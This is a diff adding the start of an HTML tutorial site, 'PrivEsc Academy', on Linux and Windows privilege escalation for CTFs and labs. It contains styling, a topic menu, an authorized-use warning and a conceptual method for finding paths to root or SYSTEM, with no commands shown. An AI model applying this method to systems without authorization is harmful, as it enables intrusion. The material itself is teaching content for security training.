@@ -1,0 +1,3982 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PrivEsc Academy · Linux & Windows Privilege Escalation</title>
+  <style>
+    :root {
+      --bg: #0b0f17;
+      --surface: #141b24;
+      --surface2: #1e2936;
+      --border: #2a3a4a;
+      --text: #e6edf5;
+      --text-dim: #9aaec2;
+      --accent: #2dd4bf;
+      --accent2: #3b82f6;
+      --danger: #f87171;
+      --warn: #fbbf24;
+      --success: #4ade80;
+      --code-bg: #0a0f14;
+      --shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
+      --radius: 14px;
+      --sidebar-width: 280px;
+      --font: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+      --mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+    }
+
+    [data-theme="light"] {
+      --bg: #f0f4f8;
+      --surface: #ffffff;
+      --surface2: #f8fafc;
+      --border: #cbd5e1;
+      --text: #0b1e2e;
+      --text-dim: #475569;
+      --accent: #0d9488;
+      --accent2: #2563eb;
+      --danger: #dc2626;
+      --warn: #d97706;
+      --success: #16a34a;
+      --code-bg: #1e293b;
+      --shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--font);
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      transition: background 0.2s, color 0.2s;
+      overflow-x: hidden;
+    }
+
+    ::-webkit-scrollbar { width: 10px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+    #sidebar {
+      position: fixed; top: 0; left: 0;
+      width: var(--sidebar-width); height: 100vh;
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      overflow-y: auto; padding: 1.2rem 0.8rem;
+      z-index: 100; transition: transform 0.3s;
+      display: flex; flex-direction: column; gap: 0.4rem;
+    }
+
+    #sidebar .logo {
+      font-size: 1.3rem; font-weight: 800;
+      letter-spacing: -0.5px;
+      padding: 0.5rem 0.8rem 1rem;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 0.6rem;
+    }
+
+    #sidebar .logo span { color: var(--accent); }
+
+    .nav-group { margin-bottom: 0.4rem; }
+
+    .nav-group-title {
+      font-size: 0.7rem; text-transform: uppercase;
+      letter-spacing: 1.5px; color: var(--text-dim);
+      padding: 0.6rem 0.8rem 0.2rem; font-weight: 700;
+    }
+
+    .nav-link {
+      display: block; padding: 0.4rem 0.8rem;
+      color: var(--text-dim); text-decoration: none;
+      border-radius: 8px; font-size: 0.88rem;
+      transition: all 0.15s; cursor: pointer;
+      border-left: 3px solid transparent;
+    }
+
+    .nav-link:hover { background: var(--surface2); color: var(--text); }
+    .nav-link.active {
+      background: var(--surface2); color: var(--accent);
+      border-left-color: var(--accent); font-weight: 600;
+    }
+
+    #main {
+      margin-left: var(--sidebar-width);
+      padding: 1.5rem 2.5rem 4rem;
+      max-width: 1200px;
+    }
+
+    .topbar {
+      display: flex; justify-content: space-between;
+      align-items: center; flex-wrap: wrap; gap: 1rem;
+      margin-bottom: 2rem; position: sticky; top: 0;
+      z-index: 50; background: var(--bg);
+      padding: 0.8rem 0; border-bottom: 1px solid var(--border);
+    }
+
+    .search-box { flex: 1; min-width: 200px; max-width: 500px; position: relative; }
+
+    .search-box input {
+      width: 100%; padding: 0.7rem 1rem 0.7rem 2.4rem;
+      border-radius: 50px; border: 1px solid var(--border);
+      background: var(--surface); color: var(--text);
+      font-size: 0.9rem; outline: none; transition: border 0.2s;
+    }
+
+    .search-box input:focus { border-color: var(--accent); }
+
+    .search-box::before {
+      content: "🔍"; position: absolute; left: 0.9rem;
+      top: 50%; transform: translateY(-50%);
+      font-size: 0.9rem; opacity: 0.6;
+    }
+
+    .theme-toggle {
+      background: var(--surface); border: 1px solid var(--border);
+      color: var(--text); padding: 0.6rem 1rem;
+      border-radius: 50px; cursor: pointer;
+      font-size: 0.9rem; transition: all 0.2s;
+    }
+
+    .theme-toggle:hover { border-color: var(--accent); }
+
+    .section { margin-bottom: 2.5rem; scroll-margin-top: 80px; }
+
+    .section h2 {
+      font-size: 1.7rem; font-weight: 700;
+      margin-bottom: 0.5rem; display: flex;
+      align-items: center; gap: 0.6rem;
+    }
+
+    .section h2 .badge {
+      font-size: 0.7rem; background: var(--accent);
+      color: #0b0f17; padding: 0.15rem 0.6rem;
+      border-radius: 50px; font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .section h3 {
+      font-size: 1.25rem; margin: 1.5rem 0 0.7rem;
+      color: var(--accent); font-weight: 600;
+    }
+
+    .section h4 {
+      font-size: 1.05rem; margin: 1rem 0 0.4rem;
+      color: var(--text); font-weight: 600;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.5rem; margin-bottom: 1.2rem;
+      box-shadow: var(--shadow); transition: border 0.2s;
+    }
+
+    .card:hover { border-color: var(--accent); }
+    .card.warn { border-left: 4px solid var(--warn); }
+    .card.danger { border-left: 4px solid var(--danger); }
+    .card.success { border-left: 4px solid var(--success); }
+
+    .callout {
+      background: var(--surface2);
+      border-left: 4px solid var(--accent2);
+      padding: 1rem 1.2rem;
+      border-radius: 8px; margin: 1rem 0;
+      font-size: 0.92rem;
+    }
+
+    .callout.warn { border-left-color: var(--warn); }
+    .callout.danger { border-left-color: var(--danger); }
+    .callout.success { border-left-color: var(--success); }
+    .callout strong { color: var(--accent); }
+
+    .code-block {
+      position: relative; background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px; margin: 0.8rem 0;
+      overflow: hidden; font-family: var(--mono);
+      font-size: 0.85rem;
+    }
+
+    .code-header {
+      display: flex; justify-content: space-between;
+      align-items: center; padding: 0.5rem 1rem;
+      background: rgba(255, 255, 255, 0.04);
+      border-bottom: 1px solid var(--border);
+      font-size: 0.75rem; color: var(--text-dim);
+      text-transform: uppercase; letter-spacing: 1px;
+    }
+
+    .code-header button {
+      background: transparent; border: 1px solid var(--border);
+      color: var(--text-dim); padding: 0.2rem 0.7rem;
+      border-radius: 5px; cursor: pointer;
+      font-size: 0.7rem; transition: all 0.15s;
+    }
+
+    .code-header button:hover { border-color: var(--accent); color: var(--accent); }
+
+    .code-block pre {
+      padding: 1rem; overflow-x: auto;
+      color: #e2e8f0; line-height: 1.5;
+    }
+
+    .code-block pre .cmd { color: #4ade80; }
+    .code-block pre .comment { color: #64748b; font-style: italic; }
+
+    table {
+      width: 100%; border-collapse: collapse;
+      margin: 1rem 0; font-size: 0.88rem;
+      border-radius: 10px; overflow: hidden;
+    }
+
+    th, td {
+      padding: 0.7rem 1rem; text-align: left;
+      border-bottom: 1px solid var(--border);
+    }
+
+    th {
+      background: var(--surface2); color: var(--accent);
+      font-weight: 600; text-transform: uppercase;
+      font-size: 0.72rem; letter-spacing: 1px;
+    }
+
+    tr:hover { background: var(--surface2); }
+
+    .accordion {
+      border: 1px solid var(--border);
+      border-radius: 10px; margin: 0.6rem 0; overflow: hidden;
+    }
+
+    .accordion-header {
+      padding: 0.9rem 1.2rem; background: var(--surface2);
+      cursor: pointer; font-weight: 600;
+      display: flex; justify-content: space-between;
+      align-items: center; transition: background 0.15s;
+    }
+
+    .accordion-header:hover { background: var(--border); }
+
+    .accordion-header::after {
+      content: "▸"; transition: transform 0.2s;
+    }
+
+    .accordion.open .accordion-header::after { transform: rotate(90deg); }
+
+    .accordion-body {
+      max-height: 0; overflow: hidden;
+      transition: max-height 0.5s ease;
+      padding: 0 1.2rem; background: var(--surface);
+    }
+
+    .accordion.open .accordion-body {
+      max-height: 12000px; padding: 1rem 1.2rem;
+    }
+
+    .checklist { list-style: none; display: flex; flex-direction: column; gap: 0.5rem; }
+    .checklist li { display: flex; align-items: flex-start; gap: 0.7rem; font-size: 0.92rem; }
+    .checklist input[type="checkbox"] {
+      margin-top: 0.25rem; accent-color: var(--accent);
+      width: 18px; height: 18px; cursor: pointer;
+    }
+
+    .tabs {
+      display: flex; gap: 0.3rem;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 1rem; flex-wrap: wrap;
+    }
+
+    .tab-btn {
+      padding: 0.6rem 1.2rem; background: transparent;
+      border: none; color: var(--text-dim);
+      cursor: pointer; font-size: 0.88rem;
+      border-bottom: 2px solid transparent;
+      transition: all 0.15s; font-family: var(--font);
+    }
+
+    .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+    .tab-btn:hover { color: var(--text); }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
+
+    .progress-bar {
+      position: fixed; top: 0; left: 0; height: 3px;
+      background: var(--accent); z-index: 200;
+      transition: width 0.1s;
+    }
+
+    #backToTop {
+      position: fixed; bottom: 2rem; right: 2rem;
+      background: var(--accent); color: #0b0f17;
+      border: none; width: 48px; height: 48px;
+      border-radius: 50%; cursor: pointer;
+      font-size: 1.2rem; display: none;
+      align-items: center; justify-content: center;
+      box-shadow: 0 4px 20px rgba(45, 212, 191, 0.4);
+      z-index: 150; transition: transform 0.2s;
+    }
+
+    #backToTop:hover { transform: scale(1.1); }
+
+    .highlight {
+      background: rgba(251, 191, 36, 0.35);
+      border-radius: 3px; padding: 0 2px;
+    }
+
+    .nav-buttons {
+      display: flex; justify-content: space-between;
+      margin-top: 3rem; gap: 1rem;
+    }
+
+    .nav-buttons button {
+      padding: 0.8rem 1.5rem; background: var(--surface);
+      border: 1px solid var(--border); color: var(--text);
+      border-radius: 10px; cursor: pointer;
+      font-size: 0.9rem; transition: all 0.2s;
+    }
+
+    .nav-buttons button:hover { border-color: var(--accent); background: var(--surface2); }
+
+    @media (max-width: 900px) {
+      #sidebar { transform: translateX(-100%); }
+      #sidebar.open { transform: translateX(0); }
+      #main { margin-left: 0; padding: 1rem; }
+      .menu-toggle { display: block !important; }
+    }
+
+    .menu-toggle {
+      display: none; background: var(--surface);
+      border: 1px solid var(--border); color: var(--text);
+      padding: 0.5rem 0.8rem; border-radius: 8px;
+      cursor: pointer; font-size: 1.2rem;
+    }
+
+    .hidden { display: none !important; }
+
+    ul, ol { padding-left: 1.3rem; margin: 0.5rem 0; }
+    li { margin: 0.2rem 0; }
+    p { margin: 0.6rem 0; }
+    a { color: var(--accent2); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+    @media (max-width: 700px) { .grid-2 { grid-template-columns: 1fr; } }
+
+    .why-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.8rem;
+      margin: 1rem 0;
+    }
+
+    @media (max-width: 700px) {
+      .why-grid { grid-template-columns: 1fr; }
+    }
+
+    .why-card {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      border-left: 3px solid var(--accent);
+      transition: border 0.2s;
+    }
+
+    .why-card:hover {
+      border-left-color: var(--accent2);
+      background: var(--surface);
+    }
+
+    .why-card .label {
+      display: inline-block;
+      font-size: 0.68rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: var(--accent);
+      margin-bottom: 0.4rem;
+      padding: 0.15rem 0.5rem;
+      background: rgba(45, 212, 191, 0.1);
+      border-radius: 4px;
+    }
+
+    .why-card .label.why { color: var(--warn); background: rgba(251, 191, 36, 0.1); }
+    .why-card .label.how { color: var(--accent2); background: rgba(59, 130, 246, 0.1); }
+    .why-card .label.when { color: var(--success); background: rgba(74, 222, 128, 0.1); }
+    .why-card .label.limit { color: var(--danger); background: rgba(248, 113, 113, 0.1); }
+    .why-card .label.blue { color: #60a5fa; background: rgba(96, 165, 250, 0.1); }
+    .why-card .label.purple { color: #c084fc; background: rgba(192, 132, 252, 0.1); }
+
+    .why-card p {
+      font-size: 0.88rem;
+      margin: 0.3rem 0 0;
+      color: var(--text);
+    }
+
+    .why-card p.dim {
+      color: var(--text-dim);
+      font-size: 0.82rem;
+    }
+
+    .flow {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 0.5rem;
+      margin: 1rem 0;
+      font-size: 0.85rem;
+    }
+
+    .flow .step {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      padding: 0.5rem 1rem;
+      border-radius: 50px;
+      font-weight: 600;
+    }
+
+    .flow .arrow {
+      color: var(--accent);
+      font-weight: 700;
+      font-size: 1.2rem;
+    }
+
+    .section-intro {
+      background: linear-gradient(135deg, var(--surface2), var(--surface));
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--accent);
+      border-radius: var(--radius);
+      padding: 1.2rem 1.5rem;
+      margin-bottom: 1.2rem;
+      font-size: 0.95rem;
+    }
+
+    .section-intro strong { color: var(--accent); }
+
+    .mental-model {
+      background: rgba(59, 130, 246, 0.06);
+      border: 1px dashed var(--accent2);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      margin: 1rem 0;
+      font-size: 0.9rem;
+    }
+
+    .mental-model .title {
+      font-weight: 700;
+      color: var(--accent2);
+      margin-bottom: 0.4rem;
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .exploit-check {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      margin: 1rem 0;
+      font-family: var(--mono);
+      font-size: 0.82rem;
+      color: #cbd5e1;
+      line-height: 1.7;
+    }
+
+    .exploit-check .title {
+      font-family: var(--font);
+      font-weight: 700;
+      color: var(--warn);
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 0.6rem;
+      display: block;
+    }
+
+    .exploit-check .ok { color: #4ade80; }
+    .exploit-check .no { color: #64748b; }
+
+    .reliability {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-size: 0.78rem;
+      font-weight: 700;
+      padding: 0.25rem 0.7rem;
+      border-radius: 50px;
+      margin-left: 0.5rem;
+      vertical-align: middle;
+    }
+
+    .rel-green { background: rgba(74, 222, 128, 0.15); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
+    .rel-yellow { background: rgba(251, 191, 36, 0.15); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3); }
+    .rel-red { background: rgba(248, 113, 113, 0.15); color: #f87171; border: 1px solid rgba(248, 113, 113, 0.3); }
+
+    .detection-box {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.8rem;
+      margin: 1rem 0;
+    }
+
+    @media (max-width: 700px) { .detection-box { grid-template-columns: 1fr; } }
+
+    .detect-card {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      font-size: 0.85rem;
+    }
+
+    .detect-card .hdr {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      font-weight: 800;
+      margin-bottom: 0.5rem;
+      display: block;
+    }
+
+    .detect-card.red .hdr { color: #f87171; }
+    .detect-card.blue .hdr { color: #60a5fa; }
+    .detect-card.green .hdr { color: #4ade80; }
+
+    .detect-card code {
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      color: #4ade80;
+      background: rgba(74, 222, 128, 0.08);
+      padding: 0.1rem 0.35rem;
+      border-radius: 4px;
+    }
+
+    .trust-flow {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      margin: 1.5rem 0;
+      padding: 1.2rem;
+      background: var(--surface2);
+      border-radius: 12px;
+      border: 1px solid var(--border);
+    }
+
+    .trust-flow .node {
+      background: var(--surface);
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      padding: 0.6rem 1.2rem;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 0.85rem;
+      text-align: center;
+      min-width: 100px;
+    }
+
+    .trust-flow .node.final {
+      border-color: var(--danger);
+      color: var(--danger);
+    }
+
+    .trust-flow .arrow {
+      color: var(--accent2);
+      font-weight: 700;
+      font-size: 1.4rem;
+    }
+
+    @media (max-width: 700px) {
+      .trust-flow { flex-direction: column; }
+      .trust-flow .arrow { transform: rotate(90deg); }
+    }
+
+    .vuln-table td:first-child {
+      font-weight: 700;
+      color: var(--accent);
+    }
+
+    .matrix-row {
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .matrix-row:hover {
+      background: var(--surface2);
+    }
+
+    .matrix-row:hover td:first-child {
+      color: var(--accent);
+    }
+
+    /* ===== EXPLOITATION BLOCK ===== */
+    .exploit-block {
+      background: linear-gradient(135deg, rgba(248, 113, 113, 0.05), rgba(251, 191, 36, 0.05));
+      border: 1px solid rgba(248, 113, 113, 0.3);
+      border-radius: 12px;
+      padding: 1.2rem 1.5rem;
+      margin: 1.2rem 0;
+      position: relative;
+    }
+
+    .exploit-block::before {
+      content: "⚠️ LAB EXPLOITATION — AUTHORIZED ENVIRONMENTS ONLY";
+      display: block;
+      font-size: 0.7rem;
+      font-weight: 800;
+      letter-spacing: 1.5px;
+      color: #f87171;
+      margin-bottom: 0.8rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px dashed rgba(248, 113, 113, 0.3);
+    }
+
+    .exploit-block h5 {
+      font-size: 0.95rem;
+      color: var(--warn);
+      margin: 0.8rem 0 0.4rem;
+      font-weight: 700;
+    }
+
+    .exploit-block p {
+      font-size: 0.88rem;
+      margin: 0.4rem 0;
+    }
+
+    /* ===== AUTHOR FOOTER ===== */
+    .author-footer {
+      margin-top: 4rem;
+      padding: 2rem;
+      background: linear-gradient(135deg, var(--surface2), var(--surface));
+      border: 1px solid var(--border);
+      border-top: 3px solid var(--accent);
+      border-radius: var(--radius);
+      text-align: center;
+    }
+
+    .author-footer h3 {
+      font-size: 1.4rem;
+      color: var(--accent);
+      margin-bottom: 0.4rem;
+      justify-content: center;
+    }
+
+    .author-footer .author-name {
+      font-size: 1.8rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin: 0.5rem 0;
+    }
+
+    .author-footer .tagline {
+      color: var(--text-dim);
+      font-size: 0.95rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .author-links {
+      display: flex;
+      justify-content: center;
+      gap: 0.8rem;
+      flex-wrap: wrap;
+      margin-top: 1rem;
+    }
+
+    .author-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.7rem 1.4rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 50px;
+      color: var(--text);
+      text-decoration: none;
+      font-size: 0.88rem;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+
+    .author-link:hover {
+      border-color: var(--accent);
+      color: var(--accent);
+      text-decoration: none;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(45, 212, 191, 0.2);
+    }
+
+    .author-link .icon {
+      font-size: 1.1rem;
+    }
+
+    .author-link.linkedin:hover { border-color: #0a66c2; color: #0a66c2; }
+    .author-link.medium:hover { border-color: #ffffff; color: #ffffff; }
+    .author-link.github:hover { border-color: #a855f7; color: #a855f7; }
+
+    .sidebar-author {
+      margin-top: auto;
+      padding: 1rem 0.8rem;
+      border-top: 1px solid var(--border);
+      font-size: 0.78rem;
+      color: var(--text-dim);
+      text-align: center;
+    }
+
+    .sidebar-author strong {
+      color: var(--accent);
+      display: block;
+      font-size: 0.85rem;
+      margin-bottom: 0.3rem;
+    }
+
+    .sidebar-author a {
+      color: var(--text-dim);
+      text-decoration: none;
+      display: inline-block;
+      margin: 0.15rem 0.3rem;
+      font-size: 0.75rem;
+    }
+
+    .sidebar-author a:hover { color: var(--accent); }
+  </style>
+</head>
+<body>
+
+  <div class="progress-bar" id="progressBar" style="width:0%"></div>
+
+  <nav id="sidebar">
+    <div class="logo">⚡ <span>PrivEsc</span> Academy</div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Home</div>
+      <a class="nav-link active" data-target="home">🏠 Overview</a>
+      <a class="nav-link" data-target="safety">⚠️ Authorized Use</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Fundamentals</div>
+      <a class="nav-link" data-target="mindset">🧠 PrivEsc Mindset</a>
+      <a class="nav-link" data-target="fundamentals">📘 What is PrivEsc?</a>
+      <a class="nav-link" data-target="attack-chain">⛓️ Attack Chain</a>
+      <a class="nav-link" data-target="workflow">🔄 Enum→Exploit Workflow</a>
+      <a class="nav-link" data-target="enumeration">🔍 Enumeration Methodology</a>
+      <a class="nav-link" data-target="vuln-vs-misconfig">⚖️ Vuln vs Misconfig</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Linux PrivEsc</div>
+      <a class="nav-link" data-target="linux-users">👤 Users & Groups</a>
+      <a class="nav-link" data-target="linux-sudo">🔑 Sudo Misconfig</a>
+      <a class="nav-link" data-target="linux-suid">⚙️ SUID / SGID</a>
+      <a class="nav-link" data-target="linux-perms">📂 File Permissions</a>
+      <a class="nav-link" data-target="linux-writable">✏️ Writable Files</a>
+      <a class="nav-link" data-target="linux-path">🛤️ PATH Hijacking</a>
+      <a class="nav-link" data-target="linux-cron">⏰ Cron Jobs</a>
+      <a class="nav-link" data-target="linux-systemd">🔧 Systemd Services</a>
+      <a class="nav-link" data-target="linux-caps">🧩 Capabilities</a>
+      <a class="nav-link" data-target="linux-kernel">💥 Kernel Exploits</a>
+      <a class="nav-link" data-target="linux-nfs">📡 NFS Misconfig</a>
+      <a class="nav-link" data-target="linux-docker">🐳 Containers</a>
+      <a class="nav-link" data-target="linux-acl">📋 POSIX ACLs</a>
+      <a class="nav-link" data-target="linux-pam">🔐 PAM</a>
+      <a class="nav-link" data-target="linux-polkit">🛂 Polkit</a>
+      <a class="nav-link" data-target="linux-dbus">🚌 D-Bus</a>
+      <a class="nav-link" data-target="linux-credentials">🔑 Credentials</a>
+      <a class="nav-link" data-target="linux-tools">🛠️ Linux Tools</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Windows PrivEsc</div>
+      <a class="nav-link" data-target="win-fundamentals">🪟 Fundamentals</a>
+      <a class="nav-link" data-target="win-enum">🔎 Enumeration</a>
+      <a class="nav-link" data-target="win-tokens">🎫 Tokens & Impersonation</a>
+      <a class="nav-link" data-target="win-privileges">⚔️ Dangerous Privileges</a>
+      <a class="nav-link" data-target="win-services">⚙️ Services</a>
+      <a class="nav-link" data-target="win-unquoted">📁 Unquoted Service Path</a>
+      <a class="nav-link" data-target="win-tasks">📅 Scheduled Tasks</a>
+      <a class="nav-link" data-target="win-perms">🔒 NTFS Permissions</a>
+      <a class="nav-link" data-target="win-dll">📚 DLL Hijacking</a>
+      <a class="nav-link" data-target="win-registry">📋 Registry</a>
+      <a class="nav-link" data-target="win-always">⬆️ AlwaysInstallElevated</a>
+      <a class="nav-link" data-target="win-pipes">🔗 Named Pipes</a>
+      <a class="nav-link" data-target="win-credentials">🔐 Credential Discovery</a>
+      <a class="nav-link" data-target="win-powershell">💻 PowerShell</a>
+      <a class="nav-link" data-target="win-tools">🛠️ Windows Tools</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Advanced</div>
+      <a class="nav-link" data-target="chaining">🔗 Attack Path Chaining</a>
+      <a class="nav-link" data-target="matrix">📊 Technique Matrix</a>
+      <a class="nav-link" data-target="linux-checklist">✅ Linux Checklist</a>
+      <a class="nav-link" data-target="win-checklist">✅ Windows Checklist</a>
+    </div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Reference</div>
+      <a class="nav-link" data-target="comparison">📊 Linux vs Windows</a>
+      <a class="nav-link" data-target="decision-tree">🌳 Decision Tree</a>
+      <a class="nav-link" data-target="labs">🧪 Labs</a>
+      <a class="nav-link" data-target="troubleshooting">🔧 Troubleshooting</a>
+      <a class="nav-link" data-target="false-positives">🚫 False Positives</a>
+      <a class="nav-link" data-target="detection">🛡️ Detection & Defense</a>
+      <a class="nav-link" data-target="cheatsheets">📋 Cheat Sheets</a>
+      <a class="nav-link" data-target="knowledge-check">❓ Knowledge Check</a>
+    </div>
+
+    <div class="sidebar-author">
+      <strong>Made by Chandan Kumar</strong>
+      <a href="https://linkedin.com/in/chandan-kumar-eh" target="_blank" rel="noopener">LinkedIn</a> ·
+      <a href="https://medium.com/@chandan20516" target="_blank" rel="noopener">Medium</a> ·
+      <a href="https://github.com/chandan-44" target="_blank" rel="noopener">GitHub</a>
+    </div>
+  </nav>
+
+  <div id="main">
+
+    <div class="topbar">
+      <button class="menu-toggle" id="menuToggle">☰</button>
+      <div class="search-box">
+        <input type="text" id="searchInput" placeholder="Search topics, commands, tools...">
+      </div>
+      <button class="theme-toggle" id="themeToggle">🌙 Dark</button>
+    </div>
+
+    <!-- ==================== HOME ==================== -->
+    <section class="section" id="home">
+      <h2>⚡ Privilege Escalation <span class="badge">Academy</span></h2>
+      <p style="font-size:1.05rem; color: var(--text-dim); max-width: 800px;">
+        A deep, structured, interactive reference guide for learning Linux and Windows privilege escalation.
+        From fundamentals to advanced practical techniques — built for CTFs, labs, and authorized security validation.
+      </p>
+
+      <div class="grid-2" style="margin-top:1.5rem;">
+        <div class="card success">
+          <h4>🐧 Linux PrivEsc</h4>
+          <p>Sudo, SUID, capabilities, cron, systemd, kernel, containers, ACLs, PAM, Polkit, and more.</p>
+        </div>
+        <div class="card success">
+          <h4>🪟 Windows PrivEsc</h4>
+          <p>Tokens, privileges, services, unquoted paths, registry, DLL hijacking, named pipes, credentials, and more.</p>
+        </div>
+      </div>
+
+      <div class="callout">
+        <strong>How to use this guide:</strong> Work through the fundamentals first. Then pick an OS and follow the enumeration methodology. Use the search bar, sidebar, and decision trees to navigate. Every command has a copy button. Every technique explains <em>why</em> it works, not just <em>how</em>.
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 The Core Mental Model</div>
+        <p>Privilege escalation is not about memorizing exploits. It's about answering one question repeatedly:</p>
+        <p style="margin-top:0.5rem; font-weight:600; color: var(--accent);">
+          "Where does a privileged process trust something that I can control?"
+        </p>
+        <p style="margin-top:0.5rem; color: var(--text-dim); font-size:0.85rem;">
+          That "something" could be a file, a path, a service, a token, a library, a registry key, or an environment variable.
+        </p>
+      </div>
+    </section>
+
+    <!-- ==================== SAFETY ==================== -->
+    <section class="section" id="safety">
+      <h2>⚠️ Authorized Use Only</h2>
+      <div class="card danger">
+        <p><strong>All techniques in this guide are for:</strong></p>
+        <ul class="checklist">
+          <li><input type="checkbox" checked disabled> Your own machines and virtual machines</li>
+          <li><input type="checkbox" checked disabled> CTF environments and intentionally vulnerable machines</li>
+          <li><input type="checkbox" checked disabled> Training labs (TryHackMe, HackTheBox, VulnHub, etc.)</li>
+          <li><input type="checkbox" checked disabled> Systems where you have explicit written authorization</li>
+        </ul>
+        <p style="margin-top:1rem; color: var(--danger);">
+          <strong>Do not</strong> use these techniques against third-party systems without authorization.
+          The purpose is education, vulnerability validation, and defensive understanding.
+        </p>
+        <p style="margin-top:1rem; padding-top:1rem; border-top:1px dashed var(--border); font-size:0.85rem; color: var(--text-dim);">
+          <strong style="color: var(--warn);">About the exploitation commands:</strong> This guide now includes lab-only exploitation steps in
+          clearly marked <em>Exploitation</em> blocks. These are for use in authorized lab environments only — your own VMs,
+          CTFs, or intentionally vulnerable machines. Never run them against systems you don't own or have written permission to test.
+        </p>
+      </div>
+    </section>
+
+    <!-- ==================== MINDSET ==================== -->
+    <section class="section" id="mindset">
+      <h2>🧠 The PrivEsc Mindset</h2>
+
+      <div class="section-intro">
+        <strong>Don't learn techniques. Learn to think.</strong> Every privilege escalation — no matter how novel — follows the same logical structure. Master this and you can discover paths you've never seen before.
+      </div>
+
+      <h3>The Universal PrivEsc Chain</h3>
+
+      <div class="trust-flow">
+        <div class="node">TRUST</div>
+        <div class="arrow">→</div>
+        <div class="node">CONTROL</div>
+        <div class="arrow">→</div>
+        <div class="node">EXECUTION</div>
+        <div class="arrow">→</div>
+        <div class="node">BOUNDARY</div>
+        <div class="arrow">→</div>
+        <div class="node final">IMPACT</div>
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">Trust</span>
+          <p>A privileged process trusts something: a file, path, token, service, library, or environment variable.</p>
+        </div>
+        <div class="why-card">
+          <span class="label blue">Control</span>
+          <p>You can influence that trusted resource — you can write, replace, redirect, or manipulate it.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">Execution</span>
+          <p>The privileged process executes, loads, or reads your controlled resource at a predictable moment.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Boundary</span>
+          <p>The execution actually crosses a privilege boundary — from your context into root/SYSTEM/Administrator.</p>
+        </div>
+      </div>
+
+      <h3>Eight Questions for Every Finding</h3>
+      <p>Whenever you discover something interesting, ask these questions in order:</p>
+      <ol>
+        <li><strong>What is privileged here?</strong> — What runs as root or SYSTEM?</li>
+        <li><strong>What does it trust?</strong> — What file, path, service, or resource does it rely on?</li>
+        <li><strong>Who controls that trusted resource?</strong> — Can I write to it? Can I replace it? Can I redirect it?</li>
+        <li><strong>Can I modify it?</strong> — Permissions, ACLs, ownership?</li>
+        <li><strong>Under which account does it execute?</strong> — root? SYSTEM? A service account?</li>
+        <li><strong>When does it execute?</strong> — On boot? On schedule? On user action?</li>
+        <li><strong>Can I influence the input?</strong> — Arguments, environment, configs?</li>
+        <li><strong>Can I reliably cross the privilege boundary?</strong> — Is it deterministic, or race-dependent?</li>
+      </ol>
